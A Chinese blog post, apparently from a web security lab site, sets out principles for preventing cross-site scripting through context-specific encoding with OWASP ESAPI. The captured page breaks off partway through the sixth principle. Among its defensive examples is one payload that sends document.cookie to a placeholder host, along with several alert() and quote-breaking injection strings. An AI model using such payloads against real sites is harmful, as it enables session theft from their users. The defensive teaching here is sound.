<!DOCTYPE html>
<!--[if IE 7]>
<html class="ie ie7" lang="zh-CN" xmlns:og="http://opengraphprotocol.org/schema/" xmlns:fb="http://www.facebook.com/2008/fbml">
<![endif]-->
<!--[if IE 8]>
<html class="ie ie8" lang="zh-CN" xmlns:og="http://opengraphprotocol.org/schema/" xmlns:fb="http://www.facebook.com/2008/fbml">
<![endif]-->
<!--[if !(IE 7) | !(IE 8)  ]><!-->
<html lang="zh-CN" xmlns:og="http://opengraphprotocol.org/schema/" xmlns:fb="http://www.facebook.com/2008/fbml">
<!--<![endif]-->
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width" />
<title>防御XSS的七条原则 | Web应用安全实验室</title>
<link rel="profile" href="http://gmpg.org/xfn/11" />
<link rel="pingback" href="http://webappsecuritylab.com/xmlrpc.php" />
<!--[if lt IE 9]>
<script src="http://webappsecuritylab.com/wp-content/themes/twentytwelve/js/html5.js" type="text/javascript"></script>
<![endif]-->
<link rel="alternate" type="application/rss+xml" title="Web应用安全实验室 &raquo; Feed" href="http://webappsecuritylab.com/?feed=rss2" />
<link rel="alternate" type="application/rss+xml" title="Web应用安全实验室 &raquo; 评论Feed" href="http://webappsecuritylab.com/?feed=comments-rss2" />
<link rel="alternate" type="application/rss+xml" title="Web应用安全实验室 &raquo; 防御XSS的七条原则评论Feed" href="http://webappsecuritylab.com/?feed=rss2&#038;p=6" />
<link rel='stylesheet' id='bsuite-default-css'  href='http://webappsecuritylab.com/wp-content/plugins/bsuite/css/default.css?ver=3.6.1' type='text/css' media='all' />
<link rel='stylesheet' id='twentytwelve-fonts-css'  href='http://fonts.googleapis.com/css?family=Open+Sans:400italic,700italic,400,700&#038;subset=latin,latin-ext' type='text/css' media='all' />
<link rel='stylesheet' id='twentytwelve-style-css'  href='http://webappsecuritylab.com/wp-content/themes/twentytwelve/style.css?ver=3.6.1' type='text/css' media='all' />
<!--[if lt IE 9]>
<link rel='stylesheet' id='twentytwelve-ie-css'  href='http://webappsecuritylab.com/wp-content/themes/twentytwelve/css/ie.css?ver=20121010' type='text/css' media='all' />
<![endif]-->
<script type='text/javascript' src='http://webappsecuritylab.com/wp-includes/js/jquery/jquery.js?ver=1.10.2'></script>
<script type='text/javascript' src='http://webappsecuritylab.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1'></script>
<script type='text/javascript' src='http://webappsecuritylab.com/wp-content/plugins/bsuite/components/js/waypoints.min.js?ver=1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wtilp = {"ajax_url":"http:\/\/webappsecuritylab.com\/wp-admin\/admin-ajax.php"};
/* ]]> */
</script>
<script type='text/javascript' src='http://webappsecuritylab.com/wp-content/plugins/wti-like-post/js/wti_like_post.js?ver=3.6.1'></script>
<script type='text/javascript' src='http://webappsecuritylab.com/wp-includes/js/comment-reply.min.js?ver=3.6.1'></script>
<script type='text/javascript' src='http://webappsecuritylab.com/wp-content/plugins/google-analyticator/external-tracking.min.js?ver=6.4.5'></script>
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://webappsecuritylab.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://webappsecuritylab.com/wp-includes/wlwmanifest.xml" /> 
<link rel='next' title='第三方组件安全' href='http://webappsecuritylab.com/?p=19' />
<meta name="generator" content="WordPress 3.6.1" />
<link rel='canonical' href='http://webappsecuritylab.com/?p=6' />
<meta property="og:title" content="防御XSS的七条原则" />
<meta property="og:type" content="blog" />
<meta property="og:url" content="http://webappsecuritylab.com/?p=6" />
<meta property="og:site_name" content="Web应用安全实验室" />
<meta property="og:description" content="Web Application Security Lab" />
<meta property="fb:admins" content="FBJS_ADMINS" />
<meta property="fb:app_id" content="FBJS_APP_ID" />
<link rel="stylesheet" type="text/css" href="http://webappsecuritylab.com/wp-content/plugins/wti-like-post/css/wti_like_post.css" media="screen" />	<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
	<style type="text/css" id="twentytwelve-header-css">
			.site-header h1 a,
		.site-header h2 {
			color: #444;
		}
		</style>
	<style type="text/css" id="custom-background-css">
body.custom-background { background-color: #e6e6e6; }
</style>
<!-- Google Analytics Tracking by Google Analyticator 6.4.5: http://www.videousermanuals.com/google-analyticator/ -->
<script type="text/javascript">
	var analyticsFileTypes = [''];
	var analyticsEventTracking = 'enabled';
</script>
<script type="text/javascript">
	var _gaq = _gaq || [];
	_gaq.push(['_setAccount', 'UA-44172237-1']);
        _gaq.push(['_addDevId', 'i9k95']); // Google Analyticator App ID with Google 
        
	_gaq.push(['_trackPageview']);

	(function() {
		var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
		                ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
		                var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
	})();
</script>
</head>

<body class="single single-post postid-6 single-format-standard custom-background custom-font-enabled single-author">
<div id="page" class="hfeed site">
	<header id="masthead" class="site-header" role="banner">
		<hgroup>
			<h1 class="site-title"><a href="http://webappsecuritylab.com/" title="Web应用安全实验室" rel="home">Web应用安全实验室</a></h1>
			<h2 class="site-description">Web Application Security Lab</h2>
		</hgroup>

		<nav id="site-navigation" class="main-navigation" role="navigation">
			<h3 class="menu-toggle">菜单</h3>
			<a class="assistive-text" href="#content" title="跳至内容">跳至内容</a>
			<div class="nav-menu"><ul><li ><a href="http://webappsecuritylab.com/" title="首页">首页</a></li></ul></div>
		</nav><!-- #site-navigation -->

			</header><!-- #masthead -->

	<div id="main" class="wrapper">
	<div id="primary" class="site-content">
		<div id="content" role="main">

			
				
	<article id="post-6" class="post-6 post type-post status-publish format-standard hentry category-2 tag-xss tag-4">
				<header class="entry-header">
									<h1 class="entry-title">防御XSS的七条原则</h1>
										<div class="comments-link">
					<a href="http://webappsecuritylab.com/?p=6#comments" title="《防御XSS的七条原则》上的评论">3条回复</a>				</div><!-- .comments-link -->
					</header><!-- .entry-header -->

				<div class="entry-content">
			<div style="clear:both; margin-top:5px; margin-bottom:5px;"></div><div style="float:right"><!-- JiaThis Button BEGIN -->
<div class="jiathis_style">
	<span class="jiathis_txt">分享到：</span>
	<a class="jiathis_button_qzone">QQ空间</a>
	<a class="jiathis_button_tsina">新浪微博</a>
	<a class="jiathis_button_tqq">腾讯微博</a>
	<a class="jiathis_button_weixin">微信</a>
	<a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank">更多</a>
</div>
<script type="text/javascript" src="http://v3.jiathis.com/code_mini/jia.js?uid=1375793756379309" charset="utf-8"></script>
<!-- JiaThis Button END --></div><div style="clear:both; margin-top:5px; margin-bottom:5px;"></div><p><fb:like href="http://webappsecuritylab.com/?p=6"></fb:like></p><p><b>前言</b></p>
<p>本文将会着重介绍防御XSS攻击的一些原则，需要读者对于XSS有所了解，至少知道XSS漏洞的基本原理，如果您对此不是特别清楚，请参考这两篇文章：《<a href="https://www.owasp.org/index.php/XSS#Stored_and_Reflected_XSS_Attacks" target="_blank">Stored and Reflected XSS Attack</a>》《<a href="https://www.owasp.org/index.php/DOM_Based_XSS" target="_blank">DOM Based XSS</a>》</p>
<p>攻击者可以利用XSS漏洞向用户发送攻击脚本，而用户的浏览器因为没有办法知道这段脚本是不可信的，所以依然会执行它。对于浏览器而言，它认为这段脚本是来自可以信任的服务器的，所以脚本可以光明正大地访问Cookie，或者保存在浏览器里被当前网站所用的敏感信息，甚至可以知道用户电脑安装了哪些软件。这些脚本还可以改写HTML页面，进行钓鱼攻击。</p>
<p>虽然产生XSS漏洞的原因各种各样，对于漏洞的利用也是花样百出，但是如果我们遵循本文提到防御原则，我们依然可以做到防止XSS攻击的发生。</p>
<p>有人可能会问，防御XSS的核心不就是在输出不可信数据的时候进行编码，而现如今流行的Web框架（比如Rails）大多都在默认情况下就对不可信数据进行了HTML编码，帮我们做了防御，还用得着我们自己再花时间研究如何防御XSS吗？答案是肯定的，对于将要放置到HTML页面body里的不可信数据，进行HTML编码已经足够防御XSS攻击了，甚至将HTML编码后的数据放到HTML标签（TAG）的属性（attribute）里也不会产生XSS漏洞（但前提是这些属性都正确使用了引号），但是，如果你将HTML编码后的数据放到了&lt;SCRIPT&gt;标签里的任何地方，甚至是HTML标签的事件处理属性里（如onmouseover），又或者是放到了CSS、URL里，XSS攻击依然会发生，在这种情况下，HTML编码不起作用了。所以就算你到处使用了HTML编码，XSS漏洞依然可能存在。下面这几条规则就将告诉你，如何<b>在正确的地方使用正确的编码</b>来消除XSS漏洞。</p>
<p><span id="more-6"></span></p>
<p><b>原则1：不要在页面中插入任何不可信数据，除非这些数已经据根据下面几个原则进行了编码</b></p>
<p>第一条原则其实是“Secure By Default”原则：不要往HTML页面中插入任何不可信数据，除非这些数据已经根据下面几条原则进行了编码。</p>
<p>之所以有这样一条原则存在，是因为HTML里有太多的地方容易形成XSS漏洞，而且形成漏洞的原因又有差别，比如有些漏洞发生在HTML标签里，有些发生在HTML标签的属性里，还有的发生在页面的&lt;Script&gt;里，甚至有些还出现在CSS里，再加上不同的浏览器对页面的解析或多或少有些不同，使得有些漏洞只在特定浏览器里才会产生。如果想要通过XSS过滤器（XSS Filter）对不可信数据进行转义或替换，那么XSS过滤器的过滤规则将会变得异常复杂，难以维护而且会有被绕过的风险。</p>
<p>所以实在想不出有什么理由要直接往HTML页面里插入不可信数据，就算是有XSS过滤器帮你做过滤，产生XSS漏洞的风险还是很高。</p>
<table width="782.0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td valign="top">&lt;script&gt;…不要在这里直接插入不可信数据&#8230;&lt;/script&gt;直接插入到SCRIPT标签里&lt;!&#8211; …不要在这里直接插入不可信数据… &#8211;&gt;</p>
<p>插入到HTML注释里</p>
<p>&nbsp;</p>
<p>&lt;div 不要在这里直接插入不可信数据=&#8221;…&#8221;&gt;&lt;/div&gt;</p>
<p>插入到HTML标签的属性名里</p>
<p>&nbsp;</p>
<p>&lt;div name=&#8221;&#8230;不要在这里直接插入不可信数据…&#8221;&gt;&lt;/div&gt;</p>
<p>插入到HTML标签的属性值里</p>
<p>&nbsp;</p>
<p>&lt;不要在这里直接插入不可信数据 href=&#8221;…&#8221;&gt;&lt;/a&gt;</p>
<p>作为HTML标签的名字</p>
<p>&nbsp;</p>
<p>&lt;style&gt;…不要在这里直接插入不可信数据&#8230;&lt;/style&gt;</p>
<p>直接插入到CSS里</td>
</tr>
</tbody>
</table>
<p>最重要的是，千万不要引入任何不可信的第三方JavaScript到页面里，一旦引入了，这些脚本就能够操纵你的HTML页面，窃取敏感信息或者发起钓鱼攻击等等。</p>
<p>&nbsp;</p>
<p><b>原则2：在将不可信数据插入到HTML标签之间时，对这些数据进行HTML Entity编码</b></p>
<p>在这里相当强调是往HTML<b>标签之间</b>插入不可信数据，以区别于往HTML标签<b>属性部分</b>插入不可信数据，因为这两者需要进行不同类型的编码。当你确实需要往HTML标签之间插入不可信数据的时候，首先要做的就是对不可信数据进行HTML Entity编码。比如，我们经常需要往DIV，P，TD这些标签里放入一些用户提交的数据，这些数据是不可信的，需要对它们进行HTML Entity编码。很多Web框架都提供了HTML Entity编码的函数，我们只需要调用这些函数就好，而有些Web框架似乎更“智能”，比如Rails，它能在默认情况下对所有插入到HTML页面的数据进行HTML Entity编码，尽管不能完全防御XSS，但着实减轻了开发人员的负担。</p>
<table width="782.0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td valign="top">&lt;body&gt;…插入不可信数据前，对其进行<b>HTML Entity编码</b>&#8230;&lt;/body&gt;&lt;div&gt;…插入不可信数据前，对其进行<b>HTML Entity编码</b>&#8230;&lt;/div&gt;&lt;p&gt;…插入不可信数据前，对其进行<b>HTML Entity编码</b>…&lt;/p&gt;以此类推，往其他HTML标签之间插入不可信数据前，对其进行<b>HTML Entity编码</b></td>
</tr>
</tbody>
</table>
<p><b>[编码规则]</b></p>
<p>那么HTML Entity编码具体应该做哪些事情呢？它需要对下面这6个特殊字符进行编码：</p>
<p>&amp;     &#8211;&gt;     &amp;amp;</p>
<p>&lt;     &#8211;&gt;     &amp;lt;</p>
<p>&gt;     &#8211;&gt;     &amp;gt;</p>
<p>&#8221;     &#8211;&gt;     &amp;quot;</p>
<p>&#8216;     &#8211;&gt;     &amp;#x27;</p>
<p>/     &#8211;&gt;     &amp;#x2f;</p>
<p>有两点需要特别说明的是:</p>
<ul>
<li>不推荐将单引号( &#8216; )编码为 &amp;apos; 因为它并不是标准的HTML标签</li>
<li>需要对斜杠号( / )编码，因为在进行XSS攻击时，斜杠号对于关闭当前HTML标签非常有用</li>
</ul>
<p>推荐使用OWASP提供的<a href="https://www.owasp.org/index.php/ESAPI" target="_blank">ESAPI</a>函数库，它提供了一系列非常严格的用于进行各种安全编码的函数。在当前这个例子里，你可以使用:</p>
<table width="782.0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td valign="top">String encodedContent = ESAPI.encoder().encodeForHTML(request.getParameter(&#8220;input&#8221;));</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p><b>原则3：在将不可信数据插入到HTML属性里时，对这些数据进行HTML属性编码</b></p>
<p>这条原则是指，当你要往HTML属性（例如width、name、value属性）的值部分(data value)插入不可信数据的时候，应该对数据进行HTML属性编码。不过需要注意的是，当要往HTML标签的事件处理属性（例如onmouseover）里插入数据的时候，本条原则不适用，应该用下面介绍的原则4对其进行JavaScript编码。</p>
<table width="782.0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td valign="top">&lt;div attr=…插入不可信数据前，进行HTML属性编码&#8230;&gt;&lt;/div&gt;属性值部分没有使用引号，不推荐&lt;div attr=&#8217;…插入不可信数据前，进行HTML属性编码&#8230;&#8217;&gt;&lt;/div&gt;</p>
<p>属性值部分使用了单引号</p>
<p>&nbsp;</p>
<p>&lt;div attr=&#8221;…插入不可信数据前，进行HTML属性编码…&#8221;&gt;&lt;/div&gt;</p>
<p>属性值部分使用了双引号</td>
</tr>
</tbody>
</table>
<p><b>[编码规则]</b></p>
<p>除了阿拉伯数字和字母，对其他所有的字符进行编码，只要该字符的ASCII码小于256。编码后输出的格式为 &amp;#xHH; （以&amp;#x开头，HH则是指该字符对应的十六进制数字，分号作为结束符）</p>
<p>之所以编码规则如此严格，是因为开发者有时会忘记给属性的值部分加上引号。如果属性值部分没有使用引号的话，攻击者很容易就能闭合掉当前属性，随后即可插入攻击脚本。例如，如果属性没有使用引号，又没有对数据进行严格编码，那么一个空格符就可以闭合掉当前属性。请看下面这个攻击：</p>
<p>假设HTML代码是这样的：</p>
<p>&lt;div width=$INPUT&gt; …content… &lt;/div&gt;</p>
<p>攻击者可以构造这样的输入：</p>
<p>x onmouseover=&#8221;javascript:alert(/xss/)&#8221;</p>
<p>最后，在用户的浏览器里的最终HTML代码会变成这个样子：</p>
<p>&lt;div width=x onmouseover=&#8221;javascript:alert(/xss/)&#8221;&gt; …content… &lt;/div&gt;</p>
<p>只要用户的鼠标移动到这个DIV上，就会触发攻击者写好的攻击脚本。在这个例子里，脚本仅仅弹出一个警告框，除了恶作剧一下也没有太多的危害，但是在真实的攻击中，攻击者会使用更加具有破坏力的脚本，例如下面这个窃取用户cookie的XSS攻击：</p>
<p>x /&gt; &lt;script&gt;var img = document.createElement(&#8220;img&#8221;);img.src = &#8221;http://hack.com/xss.js?&#8221; + escape(document.cookie);document.body.appendChild(img);&lt;/script&gt; &lt;div</p>
<p>除了空格符可以闭合当前属性外，这些符号也可以：</p>
<p>%     *     +     ,     &#8211;     /     ;     &lt;     =     &gt;     ^     |     `(反单引号，IE会认为它是单引号)</p>
<p>可以使用ESAPI提供的函数进行HTML属性编码：</p>
<table width="782.0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td valign="top">String encodedContent = ESAPI.encoder().encodeForHTMLAttribute(request.getParameter(&#8220;input&#8221;));</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p><b>原则4：在将不可信数据插入到SCRIPT里时，对这些数据进行SCRIPT编码</b></p>
<p>这条原则主要针对动态生成的JavaScript代码，这包括脚本部分以及HTML标签的事件处理属性（Event Handler，如onmouseover, onload等）。在往JavaScript代码里插入数据的时候，只有一种情况是安全的，那就是对不可信数据进行JavaScript编码，并且只把这些数据放到使用引号包围起来的值部分（data value）之中，例如：</p>
<p>&lt;script&gt;</p>
<p>var message = &#8220;&lt;%= encodeJavaScript(@INPUT) %&gt;&#8221;;</p>
<p>&lt;/script&gt;</p>
<p>除此之外，往JavaScript代码里其他任何地方插入不可信数据都是相当危险的，攻击者可以很容易地插入攻击代码。</p>
<table width="782.0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td valign="top">&lt;script&gt;alert(&#8216;…插入不可信数据前，进行JavaScript编码&#8230;&#8217;)&lt;/script&gt;值部分使用了单引号&lt;script&gt;x = &#8220;…插入不可信数据前，进行JavaScript编码…&#8221;&lt;/script&gt;</p>
<p>值部分使用了双引号</p>
<p>&nbsp;</p>
<p>&lt;div onmouseover=&#8221;x=&#8217;…插入不可信数据前，进行JavaScript编码…&#8217; &#8220;&lt;/div&gt;</p>
<p>值部分使用了引号，且事件处理属性的值部分也使用了引号</td>
</tr>
</tbody>
</table>
<p>特别需要注意的是，在XSS防御中，有些JavaScript函数是极度危险的，就算对不可信数据进行JavaScript编码，也依然会产生XSS漏洞，例如：</p>
<p>&lt;script&gt;</p>
<p>window.setInterval(&#8216;…就算对不可信数据进行了JavaScript编码，这里依然会有XSS漏洞&#8230;&#8217;);</p>
<p>&lt;/script&gt;</p>
<p>&nbsp;</p>
<p><b>[编码规则]</b></p>
<p>除了阿拉伯数字和字母，对其他所有的字符进行编码，只要该字符的ASCII码小于256。编码后输出的格式为 \xHH （以 \x 开头，HH则是指该字符对应的十六进制数字）</p>
<p>在对不可信数据做编码的时候，千万不能图方便使用反斜杠（ \ ）对特殊字符进行简单转义，比如将双引号 &#8221; 转义成 \&#8221; ，这样做是不可靠的，因为浏览器在对页面做解析的时候，会先进行HTML解析，然后才是JavaScript解析，所以双引号很可能会被当做HTML字符进行HTML解析，这时双引号就可以突破代码的值部分，使得攻击者可以继续进行XSS攻击。例如：</p>
<p>假设代码片段如下：</p>
<p>&lt;script&gt;</p>
<p>var message = &#8221; $VAR &#8220;;</p>
<p>&lt;/script&gt;</p>
<p>&nbsp;</p>
<p>攻击者输入的内容为：</p>
<p>\&#8221;; alert(&#8216;xss&#8217;);//</p>
<p>&nbsp;</p>
<p>如果只是对双引号进行简单转义，将其替换成 \&#8221; 的话，攻击者输入的内容在最终的页面上会变成：</p>
<p>&lt;script&gt;</p>
<p>var message = &#8221; \\&#8221;; alert(&#8216;xss&#8217;);// &#8220;;</p>
<p>&lt;/script&gt;</p>
<p>&nbsp;</p>
<p>浏览器在解析的时候，会认为反斜杠后面的那个双引号和第一个双引号相匹配，继而认为后续的alert(‘xss’)是正常的JavaScript脚本，因此允许执行。</p>
<p>可以使用ESAPI提供的函数进行JavaScript编码：</p>
<table width="782.0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td valign="top">String encodedContent = ESAPI.encoder().encodeForJavaScript(request.getParameter(&#8220;input&#8221;));</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p><b>原则5：在将不可信数据插入到Style属性里时，对这些数据进行CSS编码</b></p>
<p>当需要往Stylesheet，Style标签或者Style属性里插入不可信数据的时候，需要对这些数据进行CSS编码。传统印象里CSS不过是负责页面样式的，但是实际上它比我们想象的要强大许多，而且还可以用来进行各种攻击。因此，不要对CSS里存放不可信数据掉以轻心，应该只允许把不可信数据放入到CSS属性的值部分，并进行适当的编码。除此以外，最好不要把不可信数据放到一些复杂属性里，比如url, behavior等，只能被IE认识的Expression属性允许执行JavaScript脚本，因此也不推荐把不可信数据放到这里。</p>
<table width="782.0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td valign="top">&lt;style&gt;selector { property : …插入不可信数据前，进行CSS编码&#8230;} &lt;/style&gt;&lt;style&gt;selector { property : &#8221; …插入不可信数据前，进行CSS编码… &#8220;} &lt;/style&gt;&nbsp;</p>
<p>&lt;span style=&#8221; property : …插入不可信数据前，进行CSS编码… &#8221;&gt; … &lt;/span&gt;</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p><b>[编码规则]</b></p>
<p>除了阿拉伯数字和字母，对其他所有的字符进行编码，只要该字符的ASCII码小于256。编码后输出的格式为 \HH （以 \ 开头，HH则是指该字符对应的十六进制数字）</p>
<p>同原则2，原则3，在对不可信数据进行编码的时候，切忌投机取巧对双引号等特殊字符进行简单转义，攻击者可以想办法绕开这类限制。</p>
<p>可以使用ESAPI提供的函数进行CSS编码：</p>
<table width="782.0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td valign="top">String encodedContent = ESAPI.encoder().encodeForCSS(request.getParameter(&#8220;input&#8221;));</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p><b>原则6：在将不可信数据插入到HTML URL里时，对这些数据进行URL编码</b></p>
<p>当需要往HTML页面中的URL里插入不可信数据的时候，需要对其进行URL编码，如下：</p>
<table width="782.0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td valign="top">&lt;a href=&#8221;http://www.abcd.com?param=…插入不可信数据前，进行URL编码…&#8221;&gt; Link Content &lt;/a&gt;</td>
</tr>
</tbody>
</table>
<p><b>[编码规则]</b></p>
<p>除了阿拉伯数字和字母，对其他所有的字符进行编码，只要该字符的ASCII码小于256。编码后输出的格式为 %HH （以 % 开头，HH则是指该字符对应的十六进制数字）</p>
<p>在对URL进行编码的时候，有两点是需要特别注意的：</p>
<p>1) URL属性应该使用引号将值部分包围起来，否则攻击者可以很容易突破当前属性区域，插入后续攻击代码</p>
<p>2) 不要对整个URL进行编码，因为不可信数据可能会被插入到href, src或者其他以URL为基础的属性里，这时需要对数据的起始部分的协议字段进行验证，否则攻击者可以改变URL的协议，例如从HTTP协议改为DATA伪协议，或者javascript伪协议。</p>
<p>可以使用ESAPI提供